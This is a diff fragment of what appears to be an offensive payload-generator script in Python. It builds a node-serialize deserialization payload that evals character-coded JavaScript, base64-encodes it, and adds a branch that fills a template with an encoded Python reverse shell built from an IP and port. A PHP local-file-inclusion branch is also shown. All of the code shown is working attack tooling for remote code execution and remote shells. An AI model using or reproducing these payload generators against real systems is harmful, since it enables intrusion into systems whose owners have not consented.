@@ -331,6 +331,9 @@ def main():
 			print('{"run": "_$$ND_FUNC$$_function (){eval(String.fromCharCode(%s))}()"}' % temp2)
 			base64payload = '{"run": "_$$ND_FUNC$$_function (){eval(String.fromCharCode(%s))}()"}' % temp2
 			print(f"\n{base64.b64encode(base64payload.encode('ascii')).decode('ascii')}")
+		elif "{BASE64_PY3}" in j:
+			temp = base64gen_py3(ip,port)
+			print(j.replace("{BASE64_PY3}",temp.decode("ascii")).strip())
 		elif "{PHP_LFI}" in j:
 			if "{BASE64_PY3}" in j:
 			    temp = base64gen_py3(ip,port)
